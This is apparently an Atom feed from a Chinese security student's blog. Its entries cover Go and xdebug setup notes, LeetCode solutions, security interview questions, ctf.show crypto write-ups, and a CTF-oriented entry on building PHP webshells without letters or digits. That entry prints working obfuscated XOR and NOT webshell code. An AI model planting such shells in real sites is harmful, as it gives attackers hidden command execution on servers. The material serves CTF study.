<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>prontosil&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://prontosil.com/"/>
  <updated>2020-04-21T04:23:37.231Z</updated>
  <id>http://prontosil.com/</id>
  
  <author>
    <name>prontosil</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>go相关笔记</title>
    <link href="http://prontosil.com/posts/e0759275/"/>
    <id>http://prontosil.com/posts/e0759275/</id>
    <published>2020-04-21T01:56:26.000Z</published>
    <updated>2020-04-21T04:23:37.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="go相关命令"><a href="#go相关命令" class="headerlink" title="go相关命令"></a>go相关命令</h2><h3 id="go-env"><a href="#go-env" class="headerlink" title="go env"></a>go env</h3><pre><code>go env -w GOPROXY=https://goproxy.io,direct# Set environment variable allow bypassing the proxy for selected modulesgo env -w GOPRIVATE=*.corp.example.comgo env -w GO111MODULE=on</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;go相关命令&quot;&gt;&lt;a href=&quot;#go相关命令&quot; class=&quot;headerlink&quot; title=&quot;go相关命令&quot;&gt;&lt;/a&gt;go相关命令&lt;/h2&gt;&lt;h3 id=&quot;go-env&quot;&gt;&lt;a href=&quot;#go-env&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://prontosil.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="go" scheme="http://prontosil.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-560和为k的子数组</title>
    <link href="http://prontosil.com/posts/eb2e19c0/"/>
    <id>http://prontosil.com/posts/eb2e19c0/</id>
    <published>2020-04-21T01:33:53.000Z</published>
    <updated>2020-04-21T04:23:37.322Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。</p><p>示例 1 :</p><pre><code>输入:nums = [1,1,1], k = 2输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。</code></pre><h2 id="法一——暴力"><a href="#法一——暴力" class="headerlink" title="法一——暴力"></a>法一——暴力</h2><p>两重循环，对每一个数字，从它开始往后，不断地累加，然后和k进行对比，这应该是最简单的想法了，但是我做这种题还是有点晕</p><pre><code class="python">def subarraySum(nums, k):    length = len(nums)    count = 0    for i in range(length):        sum = 0        for j in range(i, length):            sum += nums[j]            if sum == k:                count += 1    return count</code></pre><h2 id="法二——hashtables"><a href="#法二——hashtables" class="headerlink" title="法二——hashtables"></a>法二——hashtables</h2><p>思路就是不断地求和，然后判断 <code>cur_sum - k</code> 是否已经计算过了</p><blockquote><p>将前缀和放入哈希表，哈希表的设计为：key是前缀和，value是前缀和出现的次数。<br>如果当前要存入的前缀和sum，使得(sum - k)也在哈希表中时，则使用count累加哈希表中(sum - k)出现的次数，然后再将该sum放入哈希表中。这里的count与sum的添加次序不能调换，主要是为了处理k为0的情况。</p></blockquote><pre><code class="python">def subarraySum(self, nums, k):    result, cur_sum = 0, 0    sum_dict = {0:1}    for num in nums:        cur_sum += num        if cur_sum - k in sum_dict:            result += sum_dict[cur_sum - k]        sum_dict[cur_sum] = sum_dict.get(cur_sum, 0) + 1    return result</code></pre><p>go实现的代码</p><pre><code class="go">func subarraySum(nums []int, k int) int {    count := 0    sumMap := map[int]int{0:1,}    sum := 0    for _, num := range nums {        sum += num        if sumMap[sum - k] &gt; 0 {            count += sumMap[sum - k]        }        sumMap[sum]++    }    return count}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;给定一个整数数组和一个整数 k，你需要找到该数组中和为 k 的连续的子数组的个数。&lt;/p&gt;
&lt;p&gt;示例 1 :&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;输入:nums = [1,1,1], k = 2
输出: 2 , [1,1] 与 [1,1] 为两种不同的情况。&lt;/code&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="leetcode" scheme="http://prontosil.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>sqlite数据库笔记</title>
    <link href="http://prontosil.com/posts/532a05c/"/>
    <id>http://prontosil.com/posts/532a05c/</id>
    <published>2020-04-20T13:39:19.000Z</published>
    <updated>2020-04-21T04:23:37.233Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ubuntu配置vscode+xdebug</title>
    <link href="http://prontosil.com/posts/38fc34e6/"/>
    <id>http://prontosil.com/posts/38fc34e6/</id>
    <published>2020-04-20T10:14:29.000Z</published>
    <updated>2020-04-21T04:23:37.234Z</updated>
    
    <content type="html"><![CDATA[<h2 id="vscode安装"><a href="#vscode安装" class="headerlink" title="vscode安装"></a>vscode安装</h2><p>直接去官网下载deb包，然后双击即可完成安装</p><p>加两个配置选项</p><pre><code>    &quot;editor.mouseWheelZoom&quot;: true,    &quot;php.validate.executablePath&quot;: &quot;/usr/bin/php&quot;</code></pre><p>第一个是直接用滚轮缩放大小，并且图标的大小不变，第二个是配置php的路径</p><p>之后安装一些插件就不说了</p><h2 id="apache环境"><a href="#apache环境" class="headerlink" title="apache环境"></a>apache环境</h2><p>直接安装</p><pre><code>sudo apt install apache2</code></pre><p>然后安装php模块</p><pre><code>sudo apt-get install libapache2-mod-php</code></pre><p>之后，修改一下html目录的用户和组</p><pre><code>chown pxy html/ -Rchgrp pxy html/ -R</code></pre><h2 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h2><pre><code>php -i &gt; a.txt</code></pre><p>然后将 a.txt 的内容拷贝到</p><p><a href="https://xdebug.org/wizard" target="_blank" rel="noopener">https://xdebug.org/wizard</a></p><p>自动帮你分析phpinfo的内容(不过现在只支持php7了)</p><ol><li><p>Download <a href="http://xdebug.org/files/xdebug-2.9.4.tgz" target="_blank" rel="noopener">xdebug-2.9.4.tgz</a></p></li><li><p>Install the pre-requisites for compiling PHP extensions.<br>On your Ubuntu system, install them with: <code>apt-get install php-dev autoconf automake</code></p></li><li><p>Unpack the downloaded file with <code>tar -xvzf xdebug-2.9.4.tgz</code></p></li><li><p>Run: <code>cd xdebug-2.9.4</code></p></li><li><p>Run: <code>phpize</code> (See the <a href="https://xdebug.org/docs/faq#phpize" target="_blank" rel="noopener">FAQ</a> if you don’t have <code>phpize</code>).</p><p>As part of its output it should show:</p><pre><code>Configuring for:...Zend Module Api No:      20170718Zend Extension Api No:   320170718</code></pre></li></ol><p>   If it does not, you are using the wrong <code>phpize</code>. Please follow <a href="https://xdebug.org/docs/faq#custom-phpize" target="_blank" rel="noopener">this FAQ entry</a> and skip the next step.</p><ol start="6"><li><p>Run: <code>./configure</code></p></li><li><p>Run: <code>make</code></p></li><li><p>Run: <code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>Update <code>/etc/php/7.2/cli/php.ini</code> and change the line<br><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></p></li><li><p>Please also update <code>php.ini</code> files in adjacent directories, as your system seems to be configured with a separate <code>php.ini</code> file for the web server and command line.</p></li></ol><p>重点是后面几个步骤：</p><ol><li><p><code>cp modules/xdebug.so /usr/lib/php/20170718</code></p></li><li><p>修改 <code>/etc/php/7.2/cli/php.ini</code> 文件内容，加上</p><pre><code>zend_extension = /usr/lib/php/20170718/xdebug.so</code></pre></li><li><p>然后还需要修改  <code>/etc/php/7.2/apache2</code> 目录下的 php.ini 这个才是web的</p></li></ol><p>如图， <code>cli</code> 目录是命令行， <code>apache2</code> 才是web的</p><p><img src="/posts/38fc34e6/1587378336782.png" alt></p><ol start="4"><li>之后还需要修改 <code>mods-available</code> 目录下的文件</li></ol><pre><code>pxy@pxy-VirtualBox:/etc/php/7.2/mods-available$ cat xdebug.ini ;zend_extension=xdebug.soxdebug.remote_enable = 1xdebug.remote_port = 9000;xdebug.idekey = PHPSTORMxdebug.remote_host=localhostxdebug.remote_autostart = 1xdebug.show_error_trace = 1</code></pre><ol start="5"><li>最后需要在web和cli下的 <code>conf.d</code> 中做一次软链接</li></ol><p><img src="/posts/38fc34e6/1587378447111.png" alt></p><p>至此xdebug+vscode就配置好了</p><p><img src="/posts/38fc34e6/1587378474835.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;vscode安装&quot;&gt;&lt;a href=&quot;#vscode安装&quot; class=&quot;headerlink&quot; title=&quot;vscode安装&quot;&gt;&lt;/a&gt;vscode安装&lt;/h2&gt;&lt;p&gt;直接去官网下载deb包，然后双击即可完成安装&lt;/p&gt;
&lt;p&gt;加两个配置选项&lt;/p&gt;
&lt;pre
      
    
    </summary>
    
    
      <category term="编程" scheme="http://prontosil.com/categories/%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Linux" scheme="http://prontosil.com/tags/Linux/"/>
    
      <category term="vscode" scheme="http://prontosil.com/tags/vscode/"/>
    
      <category term="xdebug" scheme="http://prontosil.com/tags/xdebug/"/>
    
  </entry>
  
  <entry>
    <title>汇编从入门到入土六</title>
    <link href="http://prontosil.com/posts/79b4f583/"/>
    <id>http://prontosil.com/posts/79b4f583/</id>
    <published>2020-04-20T01:23:24.000Z</published>
    <updated>2020-04-21T04:23:37.323Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>春招面经汇总</title>
    <link href="http://prontosil.com/posts/ddd168ac/"/>
    <id>http://prontosil.com/posts/ddd168ac/</id>
    <published>2020-04-19T23:44:35.000Z</published>
    <updated>2020-04-21T06:31:01.281Z</updated>
    
    <content type="html"><![CDATA[<p>从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗</p><h2 id="长亭"><a href="#长亭" class="headerlink" title="长亭"></a>长亭</h2><ol><li>自我介绍</li><li>tomcat AJP漏洞了解过吗</li><li>Java反序列化漏洞</li><li>JNDI注入，Java7和Java8的区别(这里确实是自己挖坑了，简历上写了自己会Java审计，JNDI注入等，但是并没有仔细准备，结果面试官抓着Java不放)</li><li>XXE如果无法联网怎么利用(三层嵌套报错XXE或者利用系统自带的DTD文件)</li><li>你比较擅长的方面</li></ol><p>不知道为啥和长亭面试官聊起来挺尬的。最后也只面试了20分钟就结束了，当然结果是凉凉了</p><h2 id="字节跳动-企业应用安全"><a href="#字节跳动-企业应用安全" class="headerlink" title="字节跳动-企业应用安全"></a>字节跳动-企业应用安全</h2><h3 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h3><ol><li>具体的一个代码审计案例</li><li>说一下你知道的四种漏洞的原理，利用，危害和防御</li><li>XSS知道吗</li><li>说一下前端漏洞中你比较熟悉的</li><li>python沙盒逃逸</li><li>你觉得自己的优势是什么</li><li>对未来的规划</li></ol><p>字节跳动一面官感觉挺棒的，全程在引导你，而且特别尊重你说出自己的看法</p><h3 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h3><ol><li>简单问了几个小问题，python沙盒逃逸，JavaScript原型链污染</li><li>有没有了解过electron框架（就是开发vscode的，我说没有，但是我知道vue</li><li>vue怎么防御csrf(我不太了解vue怎么防范，先说一些怎么防CSRF balabal)</li><li>提示vue是通过ajax和后端连接，我：哦想起来了，那就用CORS来防御，然后说了CORS的防御</li><li>继续问。CORS分为简单请求和非简单请求，一个POST请求怎么区分</li><li>java做过哪些</li><li>mXSS了解吗</li><li>参数压栈入栈简单说下</li><li>你怎么将CTF学到的用到实战</li><li>go有没有了解</li></ol><p>二面面试官也挺棒的，唯一的问题就是。。。他家的小孩子太吵了。。几次打断我的思路</p><h3 id="三面"><a href="#三面" class="headerlink" title="三面"></a>三面</h3><p>三面是部门leader面，本来以为会继续问技术的，结果。。问了一堆人生相关的问题，而且回答的不好，没有完全表现出自己的水平。。</p><ol><li>第一次打CTF的经历(就是由于一开始的这个问题导致我后面都在说CTF，可能leader觉得我的眼界太小了吧)</li><li>你对未来的规划(这种问题真心不好回答)</li><li>你是怎么选择上这个专业的</li><li>你认为你还有哪些技能需要完善</li><li>你觉得学习编程语言需要注意哪些</li><li>go的垃圾回收机制(这个真是自己多嘴了，不该说自己学了点go的，这个问题没答上来)</li><li>go的并发机制有哪些(我就知道channel。。)</li></ol><p>周五面试完，下周一结果出来后就凉凉了，之后转岗到安全与风控部门，结果这是个开发岗，问的问题都是和编程有关的</p><p>只记录了几个问题：</p><ol><li>http1.0和1.1的区别</li><li>hashtable的原理</li><li>进程和线程的区别</li><li>进程间通信的方式</li><li>hash冲突解决</li><li>tcp和udp协议</li><li>用c语言实现双链表的插入和删除</li></ol><p>面试了一个多小时。。最后面试官说看了我的博客觉得我在漏洞挖掘，渗透这块还行，建议我投其他的部门，我说我就是转岗过来的。。。</p><h2 id="知道创宇-404实验室"><a href="#知道创宇-404实验室" class="headerlink" title="知道创宇 - 404实验室"></a>知道创宇 - 404实验室</h2><p>知道创宇是3月5号投递的，结果3月底才安排面试，以至于我都忘记投递了。</p><ol><li>分享几个cms漏洞挖掘的案例</li><li>代码审计的思路</li><li>假设一个cms你找到了一个反序列化的入口，如何挖掘POP链</li><li>如果cms中找不到POP链怎么利用(不知道，面试官告诉我可以用内置的类进行反序列化)</li><li>印象最深的一道CTF题</li><li>解释一下js的原型链污染</li><li>说一下你对tomcat AJP漏洞的分析</li><li>除了CTF，代码审计你还从哪里学安全知识</li><li>储存型XSS但是httponly了怎么利用</li><li>说一下redis主从复制漏洞</li><li>解释一下python的全局变量锁</li><li>python什么时候会用到多线程，什么时候用到多进程</li><li>为什么python的多线程是伪多线程</li><li>开发一个cms自动化代码审计的工具你有哪些思路</li></ol><h2 id="腾讯-应用运维安全"><a href="#腾讯-应用运维安全" class="headerlink" title="腾讯-应用运维安全"></a>腾讯-应用运维安全</h2><p>我后来才知道腾讯面试的流程，首先有一个公共的简历池，之后每个部门在里面捞简历，一般看到一份还行的简历会打电环了解一下情况(所以我接了好几个了解情况的电话)，之后如果要面试的话需要锁定这一份简历，这样的话其他部门就无法面试你，只有锁定简历的部门才行。</p><p>两轮电话了解情况之后，我的简历投到了应用运维安全，具体哪个事业群不知道</p><h3 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h3><ol><li>入侵响应</li><li>重置密码逻辑漏洞</li><li>RMI 利用的一个流程</li><li>flask SSTI 漏洞</li><li>XSS怎么防护</li><li>CSP如何绕</li><li>安全开发流程</li><li>JavaScript 闭包</li><li>常用远程控制软件</li><li>SQL过滤了单引号怎么绕过</li><li>SQL注入如何防护</li><li>Linux查看进程和查看端口的命令</li></ol><p>之后网申的页面提示进入了复试阶段，但是一直没更新。直到变灰。</p><h2 id="腾讯-后台策略安全"><a href="#腾讯-后台策略安全" class="headerlink" title="腾讯-后台策略安全"></a>腾讯-后台策略安全</h2><p>本来以为腾讯没希望了，人都去新疆给做培训了，结果腾讯微信事业群联系我问有没有意向</p><h3 id="4-9-0面"><a href="#4-9-0面" class="headerlink" title="4.9 0面"></a>4.9 0面</h3><p>问了大概一个多小时，感觉就是提前了解情况，后来才知道也不是一面。姑且叫做0面好了，面完之后也没有做记录，只有靠回忆了</p><ol><li>说一下python沙盒逃逸</li><li>了解过nodejs的沙盒逃逸吗</li><li>说一下JavaScript原型链污染</li><li>dll注入了解过吗</li><li>二进制程序常见的壳，脱壳的方法</li><li>了解过大数据吗</li><li>编程题: 将一个数组的奇数移到前面，偶数移到后面</li></ol><h3 id="4-11-一面"><a href="#4-11-一面" class="headerlink" title="4.11 一面"></a>4.11 一面</h3><ol><li>https和http的区别</li><li>http怎么防止运营商篡改你的流量</li><li>操作系统进程通信方式</li><li>XSS和CSRF</li><li>二次注入</li><li>web安全有没有总结一些方法论什么的</li><li>操作系统的最小调度单位是什么，操作系统资源分配的最小单位是什么，如果一个进程crash了，它的线程会发生什么</li><li>tcp为啥要三次握手，两次和四次不行吗</li><li>脱壳的方式</li><li>编程题：二分查找</li></ol><h3 id="4-13-二面"><a href="#4-13-二面" class="headerlink" title="4.13 二面"></a>4.13 二面</h3><p>这一面感觉面的挺尬的，面完后还觉得自己凉了，面完之后每天都忍不住去看官网的状态</p><ol><li>有没有渗透攻防经历</li><li>逆向了解过哪些</li><li>小程序游戏，比如跳一跳，怎么防止查重</li><li>二进制安全学习过哪些.</li><li>java安全学习过哪些</li><li>apk逆向了解不</li><li>java的hashtable实现原理</li><li>hash泛洪攻击了解吗</li><li>tcp泛红攻击</li><li>你认为你相比其他人的优势</li><li>你玩过哪些微信游戏</li><li>内容安全了解吗</li><li>编程题：数组去重</li></ol><h3 id="4-17-三面"><a href="#4-17-三面" class="headerlink" title="4.17 三面"></a>4.17 三面</h3><p>第一次在机场面试。。实在是没办法，这是腾讯校招的最后一天必须得面完</p><p>然而面试官问我的问题我都没听明白</p><ol><li>怎么检测开发者绕过我们设定的策略</li><li>如何检测内容安全</li><li>如何防止外挂</li><li>你还有什么补充的(然后我就开始跑火车了)</li></ol><p>由于在机场，面试也只持续了半个小时左右</p><h3 id="4-18-hr面"><a href="#4-18-hr面" class="headerlink" title="4.18 hr面"></a>4.18 hr面</h3><ol><li>你认为你相对别人的优势</li><li>之前没有实习经历</li><li>之前有投递过其他的安全公司吗</li><li>你觉得这个岗位和你相契合吗</li><li>你父母的工作，你父母对你的影响</li></ol><p>聊了大概大概十分钟，面试官声音很有特点。面试的邀请函都是4.18号凌晨发过来的，估计在加班hhhh</p><h2 id="阿里"><a href="#阿里" class="headerlink" title="阿里"></a>阿里</h2><p>2月底的时候看到博客园的一个师傅，首页上写着阿里云云安全团队长期招收实习生，于是联系了他，做了一次简单的非正式面试，校招开始的时候也是他帮我内推的</p><h3 id="一面-2"><a href="#一面-2" class="headerlink" title="一面"></a>一面</h3><p>一面很水，不到二十分钟，感觉就是简单了解了情况</p><h3 id="二面-1"><a href="#二面-1" class="headerlink" title="二面"></a>二面</h3><ol><li>渗透测试有没有做过</li><li>怎么检测反弹shell</li><li>怎么检测黑客入侵Linux服务器</li><li>structs2漏洞说一下 </li><li>cms审计说一说</li><li>系统提权说一说</li><li>有没有做过演讲</li><li>安全方面有哪些成就</li><li>IOT哪些产出</li></ol><p>答得不是很好，结果凉凉</p><h2 id="华为"><a href="#华为" class="headerlink" title="华为"></a>华为</h2><h3 id="笔试"><a href="#笔试" class="headerlink" title="笔试"></a>笔试</h3><p>华为这次笔试感觉真的难，只有单选，不定项选(少选不给分)，和一道编程题</p><ol><li>fuzz框架考了很多，而且都是问用处，但是我都不知道</li><li>Linux的操作也考了一些，比如 <code>/etc/profile</code> 文件中设置的环境变量对所有用户都生效</li><li>web安全，有直接给源码问你漏洞点的，还有一些基本概念，这个反倒是不难</li><li>二进制安全，有一道直接考ROP链的，让你选择栈布局</li></ol><p>不知道还有没有后续的面试</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>校招还是比较看重基础，但是对于偏乙方的比如长亭和知道创宇可能要求你有一些比较擅长的点，而且会问的比较细。大厂主要是看你的基础知识是不是很扎实。感觉面试的很多问题都是可以直接从网上找到答案的，但是还是要拿来问emmm。最后，感觉面试真是3分运气，7分实力，不过不到最后也不要轻言放弃，万一呢，万一呢。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从2月到4月，中间大大小小经历了20次左右的面试，最后选择去腾讯WXG的后台策略安全岗&lt;/p&gt;
&lt;h2 id=&quot;长亭&quot;&gt;&lt;a href=&quot;#长亭&quot; class=&quot;headerlink&quot; title=&quot;长亭&quot;&gt;&lt;/a&gt;长亭&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;自我介绍&lt;/li&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="生活" scheme="http://prontosil.com/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="面经" scheme="http://prontosil.com/tags/%E9%9D%A2%E7%BB%8F/"/>
    
  </entry>
  
  <entry>
    <title>密码学题目</title>
    <link href="http://prontosil.com/posts/1dea6763/"/>
    <id>http://prontosil.com/posts/1dea6763/</id>
    <published>2020-04-18T07:21:05.000Z</published>
    <updated>2020-04-21T04:23:37.264Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下ctf.show平台</p><p><a href="https://ctf.show/challenges" target="_blank" rel="noopener">https://ctf.show/challenges</a></p><h2 id="crypto0"><a href="#crypto0" class="headerlink" title="crypto0"></a>crypto0</h2><p>凯撒密码</p><p><img src="/posts/1dea6763/1586531882516-1587195417553.png" alt></p><h2 id="crypto2"><a href="#crypto2" class="headerlink" title="crypto2"></a>crypto2</h2><p>jsfuck</p><p><img src="/posts/1dea6763/1587194700279.png" alt></p><h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>还是jsfuck编码</p><p><img src="/posts/1dea6763/1587194728413.png" alt></p><h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p>p=447685307 q=2037 e=17</p><p>提交flag{d}即可</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e 求d&#39;&#39;&#39;# p = 3487583947589437589237958723892346254777# q = 8767867843568934765983476584376578389# e = 65537p=18443q=49891e=19phin = (p - 1) * (q - 1)print gmpy2.invert(e, phin)</code></pre><h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p>p=447685307 q=2037 e=17 c=704796792</p><p>提交flag{m}</p><pre><code class="python">import gmpy2&#39;&#39;&#39;给出p,q,e,c 求d和m&#39;&#39;&#39;p=447685307q=2037e=17c=704796792phin = (p - 1) * (q - 1)d = gmpy2.invert(e, phin)print pow(c,d,p*q)</code></pre><h2 id="crypto7"><a href="#crypto7" class="headerlink" title="crypto7"></a>crypto7</h2><p>ook解密</p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><pre><code>flag{b615c4b79a1aede83b9ae67104ff4eb5}</code></pre><h2 id="crypto8"><a href="#crypto8" class="headerlink" title="crypto8"></a>crypto8</h2><p>brainfuck解密</p><pre><code>flag{99754106633f94d350db34d548d6091a}</code></pre><h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>密码是4132</p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p><p><img src="/posts/1dea6763/1586560529022.png" alt></p><h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><p>邮件编码</p><h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>解密后就是ctf</p><h2 id="crypto13"><a href="#crypto13" class="headerlink" title="crypto13"></a>crypto13</h2><p>混合加密</p><pre><code class="python">import base64def base(s):    try:        s = base64.b32decode(s)        s = base(s)    except:        try:            s = base64.b64decode(s)            s = base(s)        except:            return s    return sf = open(&#39;base.txt&#39;)text = f.read()print(base(text))</code></pre><p>flag{b4Se_Fami1y_Is_FUn}</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;记录一下ctf.show平台&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://ctf.show/challenges&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.show/challenges&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;cr
      
    
    </summary>
    
    
      <category term="密码学" scheme="http://prontosil.com/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="CTF" scheme="http://prontosil.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="http://prontosil.com/posts/bed5b94f/"/>
    <id>http://prontosil.com/posts/bed5b94f/</id>
    <published>2020-04-05T08:08:20.000Z</published>
    <updated>2020-04-21T04:23:37.265Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="php">&lt;?phpif(!preg_match(&#39;/[a-z0-9]/is&#39;,$_GET[&#39;shell&#39;])) {  eval($_GET[&#39;shell&#39;]);}</code></pre><h2 id="通过异或"><a href="#通过异或" class="headerlink" title="通过异或"></a>通过异或</h2><p>原理</p><pre><code class="php">php &gt; echo chr(0x01)^&#39;`&#39;;aphp &gt; echo chr(0x13)^&#39;`&#39;;sphp &gt; echo chr(0x05)^&#39;`&#39;;e</code></pre><p>所以即可构造：</p><pre><code class="php">$_=(&#39;%01&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%13&#39;^&#39;`&#39;).(&#39;%05&#39;^&#39;`&#39;).(&#39;%12&#39;^&#39;`&#39;).(&#39;%14&#39;^&#39;`&#39;); //$_=assert$__=&#39;_&#39;.(&#39;%0D&#39;^&#39;]&#39;).(&#39;%2F&#39;^&#39;`&#39;).(&#39;%0E&#39;^&#39;]&#39;).(&#39;%09&#39;^&#39;]&#39;); // $__ = _POST$___=$$__; //$___ = $_POST$_($___[_]);// assert($_POST[_])</code></pre><p>在 <code>php5.5.38</code> 通过测试</p><p><img src="/posts/bed5b94f/1586074270072.png" alt></p><p>但是如果切换为 <code>php7.1.3</code> 执行失败</p><p><img src="/posts/bed5b94f/1586074316094.png" alt></p><h3 id="构造webshell"><a href="#构造webshell" class="headerlink" title="构造webshell"></a>构造webshell</h3><p>通过这种方式可以构造异或形式的webshell</p><pre><code class="php">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST     ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><pre><code>0=assert&amp;1=phpinfo()</code></pre><p>在 AWD 中常用来做隐藏的shell</p><p><img src="/posts/bed5b94f/1586074779485.png" alt></p><p>当然这种马是直接被杀的</p><p><img src="/posts/bed5b94f/1586074826727.png" alt></p><h3 id="绕过长度限制"><a href="#绕过长度限制" class="headerlink" title="绕过长度限制"></a>绕过长度限制</h3><pre><code class="php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;])){    $code = $_GET[&#39;code&#39;];    if(strlen($code)&gt;40){        die(&quot;Long.&quot;);    }    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){        die(&quot;NO.&quot;);    }    @eval($code);}else{    highlight_file(__FILE__);}//$hint =  &quot;php function getFlag() to get flag&quot;;?&gt;</code></pre><p>首先我们得知道 <code>_GET</code> 由什么异或而来的，<a href="https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#_12" target="_blank" rel="noopener">参考</a></p><pre><code>&lt;?php    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>这段代码一大坨是啥意思呢？因为 40 个字符长度的限制，导致以前逐个字符异或拼接的 webshell 不能使用。<br>这里可以使用 php 中可以执行命令的反引号 ``` 和 <code>Linux</code> 下面的通配符 <code>?</code></p><ul><li><code>?</code> 代表匹配一个字符</li><li>``` 表示执行命令</li><li><code>&quot;</code> 对特殊字符串进行解析</li></ul><p>这样就可以直接得到 </p><pre><code>php &gt; echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;_GET</code></pre><p>然后再构造</p><pre><code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code></pre><p>这样就构造好了shell</p><p><img src="/posts/bed5b94f/1586075401555.png" alt></p><h2 id="通过取反"><a href="#通过取反" class="headerlink" title="通过取反"></a>通过取反</h2><pre><code class="php">&lt;?php$__=(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;);$_=$__/$__;$____=&#39;&#39;;$___=&quot;瞰&quot;;$____.=~($___{$_});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;和&quot;;$____.=~($___{$__});$___=&quot;的&quot;;$____.=~($___{$_});$___=&quot;半&quot;;$____.=~($___{$_});$___=&quot;始&quot;;$____.=~($___{$__});$_____=&#39;_&#39;;$___=&quot;俯&quot;;$_____.=~($___{$__});$___=&quot;瞰&quot;;$_____.=~($___{$__});$___=&quot;次&quot;;$_____.=~($___{$_});$___=&quot;站&quot;;$_____.=~($___{$_});$_=$$_____;$____($_[$__]);</code></pre><h2 id="通过加法运算"><a href="#通过加法运算" class="headerlink" title="通过加法运算"></a>通过加法运算</h2><pre><code class="php">&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#39;Arraycode></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
if(!preg_match(&amp;#39;/[a-z0-9]/is&amp;#39;,$_GET[&amp;#39;shell&amp;#39;])) {
  eval($_GET[&amp;#39;shell&amp;#39;]);
}&lt;/code&gt;&lt;/p
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://prontosil.com/categories/CTF/"/>
    
    
      <category term="webshell" scheme="http://prontosil.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell检测思路</title>
    <link href="http://prontosil.com/posts/d7bd6781/"/>
    <id>http://prontosil.com/posts/d7bd6781/</id>
    <published>2020-04-03T09:51:50.000Z</published>
    <updated>2020-04-04T23:52:44.154Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Linux应急响应</title>
    <link href="http://prontosil.com/posts/e756113b/"/>
    <id>http://prontosil.com/posts/e756113b/</id>
    <published>2020-04-03T09:08:25.000Z</published>
